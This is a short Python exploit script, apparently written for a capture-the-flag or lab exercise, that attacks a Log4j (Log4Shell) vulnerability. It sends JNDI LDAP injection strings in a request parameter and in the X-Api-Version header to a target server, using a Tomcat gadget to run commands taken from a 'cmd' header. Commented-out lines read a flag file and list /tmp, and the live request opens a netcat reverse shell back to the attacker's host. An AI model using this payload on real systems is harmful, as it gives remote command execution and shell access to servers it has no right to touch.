# -*- coding:utf8 -*- #
# -----------------------------------------------------------------------------------
# ProjectName:   Jakiro_pro
# FileName:     log4j.py
# Author:      Jakiro
# Datetime:    2022/1/6 09:50
# Description:
# 命名规则  文件名小写字母+下划线，类名大驼峰，方法、变量名小写字母+下划线连接
# 常量大写，变量和常量用名词、方法用动词
# -----------------------------------------------------------------------------------


import requests

# se = requests.session()
# header = {
#     "cmd": "cat /tmp/flag-{bmh2ab18879-0a39-43e6-9261-aa4620ec8a7f}"
# }
# data = {
#     'payload': '${jndi:ldap://10.10.10.41:1389/TomcatBypass/TomcatEcho}'
# }
# res = se.post(r'http://10.10.30.171:9832/hello', params=data, headers=header)
# print(res.text)
se = requests.session()
# header = {
#     'X-Api-Version': '${jndi:ldap://10.10.10.41:1389/TomcatBypass/TomcatEcho}',
#     "cmd": "ls -la /tmp"
# }

# res = se.get(r'http://10.10.30.171:36248', headers=header)
# print(res.text)


# ldap = 'ldap://0.0.0.0:1389/TomcatBypass/ReverseShell/10.10.10.41/1212'
header = {
    'X-Api-Version': '${jndi:ldap://10.10.10.41:1389/TomcatBypass/TomcatEcho}',
    "cmd": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.10.41 1212 >/tmp/f"
}
res = se.get(r'http://10.10.30.171:8141', headers=header)
print(res.text)
